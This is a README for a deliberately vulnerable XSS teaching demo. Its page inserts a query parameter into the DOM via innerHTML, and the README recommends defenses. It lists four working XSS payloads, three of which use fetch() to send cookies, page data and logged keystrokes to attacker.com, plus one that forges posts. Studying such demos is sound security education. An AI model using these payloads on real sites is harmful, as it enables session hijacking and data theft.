# XSS Demo

This repository contains a small HTML demo used to illustrate how unsafe handling of user-supplied input can lead to cross-site scripting (XSS) risks.

**What this repo contains**

- `index.html` — a tiny page that reads a `name` query parameter and shows it in the page; it also demonstrates setting a cookie via `document.cookie`.
- Multiple XSS attack vectors documented in comments showing how an attacker can exploit the vulnerability.

**Security notes & recommendations**

- Vulnerability: inserting untrusted input into the DOM using `innerHTML` (or otherwise injecting raw HTML) allows script execution and XSS.
- Avoid this by using `textContent` or `createTextNode` and DOM APIs so input is treated as text, not HTML.
- For production systems, perform server-side input validation and sanitization and use a vetted sanitizer (for example, DOMPurify) if any HTML must be allowed.
- Set sensitive cookies from the server with the `HttpOnly` and `Secure` flags so they are not readable from JavaScript.
- Use a Content Security Policy (CSP) to reduce the impact of possible injections.

**Attack vectors documented in the code**

1. **Cookie stealing**: `?name=<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)"/>`
   - Reads the non-HttpOnly cookie and sends it to an attacker server.

2. **Unauthorized post creation**: `?name=<img src="x" onerror="createPost('Hacked', 'This is a hacked post')"/>`
   - Calls the `createPost()` function to submit a fake post impersonating the user.

3. **User data theft**: `?name=<img src="x" onerror="fetch('https://attacker.com/steal?user=' + document.getElementById('user').innerHTML)"/>`
   - Extracts the rendered HTML content and sends it to an attacker server.

4. **Keystroke logging**: `?name=<img src="x" onerror="let buffer = ''; let timeoutId = null; document.addEventListener('keydown', function(e) { buffer = buffer + e.key; clearTimeout(timeoutId); timeoutId = setTimeout(() => { fetch('https://attacker.com/keystroke?key=' + buffer); buffer = ''; }, 2000); });"/>`
   - Captures user keystrokes with a 2-second buffer and sends them to an attacker server.

**How to run**

Serve the folder and open `index.html` in a browser. For a quick local server:

```sh
python -m http.server 8000
# then open http://localhost:8000/
```
